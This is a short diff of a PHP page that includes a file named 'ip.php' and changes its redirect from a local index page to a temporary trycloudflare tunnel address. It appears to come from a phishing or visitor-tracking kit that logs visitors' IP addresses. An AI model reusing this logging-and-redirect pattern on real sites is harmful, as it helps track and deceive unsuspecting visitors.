@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: /index.html');
+header('Location: https://pgp-gnu-replaced-livestock.trycloudflare.com/index.html');
 exit
 ?>
